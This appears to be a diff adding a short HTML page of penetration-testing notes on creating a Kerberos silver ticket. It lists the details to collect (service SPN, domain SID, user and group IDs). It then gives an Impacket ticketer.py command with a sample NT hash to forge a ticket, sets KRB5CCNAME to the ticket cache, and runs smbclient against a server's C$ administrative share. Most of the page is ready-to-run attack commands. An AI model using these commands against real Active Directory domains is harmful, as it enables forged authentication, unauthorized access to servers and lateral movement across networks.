@@ -1,0 +1,18 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Create A Silver Ticket</title>
+</head><body>You'll need to find a few pieces of information for this: SPN of the service you want to access, domain SID, domain user account SID and account name with local admin access, and a domain group that user is a member of if it's group-based local admin.<br/>
+<br/>
+For the service, the most common will be cifs/ as it maps back to the HOST/ service<br/>
+<br/>
+<br/>
+<b>Generate a Silver Ticket using Impacket's ticketer.py</b><br/>
+./ticketer.py -nthash 09e55a127f3d4e4957c77de30000502a -domain-sid S-1-5-21-7375663-6890924511-1272660413 -domain DOMAIN.COM -spn cifs/SERVER.DOMAIN.COM -user-id 123456 -groups 4321 username<br/>
+<br/>
+<b>Set the generated ccache file to the appropriate environment variable</b><br/>
+export KRB5CCNAME=/root/Assessments/NTLMTest/USERNAME.ccache<br/>
+<br/>
+<b>Use smbclient, wmiexec, psexec, or any other impacket tool</b><br/>
+smbclient -k //SERVER.DOMAIN.COM/c$ -d</body></html>
